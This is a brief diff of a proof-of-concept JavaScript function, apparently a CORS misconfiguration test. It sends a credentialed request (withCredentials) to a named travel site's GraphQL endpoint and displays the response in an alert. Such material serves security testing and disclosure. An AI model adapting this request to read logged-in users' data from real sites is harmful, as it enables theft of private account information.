@@ -17,9 +17,9 @@ function cors() {
       document.getElementById("TileContainer").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("POST", "https://www.agoda.com/graphql/npc", true);
+  xhttp.open("GET", "https://www.agoda.com/graphql/", true);
   xhttp.withCredentials = true;
-  xhttp.send();
+  xhttp.send(null);
 }
 </script>
  
